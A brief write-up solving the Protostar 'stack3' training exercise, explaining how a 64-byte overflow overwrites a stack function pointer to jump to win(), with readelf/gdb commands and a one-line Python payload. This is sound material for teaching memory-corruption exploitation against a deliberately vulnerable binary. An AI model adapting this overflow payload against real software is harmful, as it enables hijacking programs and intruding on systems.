## Description

[Problem source](https://exploit-exercises.com/protostar/stack3/)


### Solution

This problem introduces function pointer, that lives on the stack. We want to
overwrite this variable in order to hijack the thread of execution. The function
that we want to run is the `win()` function. In order to see where in the memory
this function will live we can use either `readelf` or `gdb`.

	readelf -a ./stack3 | grep win

or
	info address win

inside gdb.

Anyway, the address of `win()` function is `0x8048424`. The arranegement of
variables on the stack is the same, so we can use the same formula for this
problem as well 64 bytes + desired value.
	
	python -c "print('a' * 64 + '\x24\x84\x04\x08')" | ./stack3
